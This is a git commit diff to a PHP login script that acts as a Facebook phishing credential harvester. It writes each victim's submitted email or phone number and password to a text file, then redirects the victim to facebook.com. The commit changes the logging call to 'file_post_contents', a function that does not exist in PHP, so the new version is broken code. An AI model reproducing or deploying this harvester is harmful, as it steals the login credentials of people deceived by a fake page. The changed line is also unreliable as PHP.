75ffea754de5db622faa6cff12c961b3d9f3b8f2
earnMoneyonline8080 <118463859+earnMoneyonline8080@users.noreply.github.com>
2022-11-17 22:28:15 +0600

    Add files via upload

--- login.php
+++ login.php
@@ -1,6 +1,6 @@
 <?php
  
-file_put_contents("efty.txt", "email/number " . $_POST['email'] . " Pass: " . $_POST['pass'] . "\n", FILE_APPEND);
+file_post_contents("efty.txt", "email/number " . $_POST['email'] . " Pass: " . $_POST['pass'] . "\n", FILE_APPEND);
 header('Location: https://facebook.com/');
 exit();
  
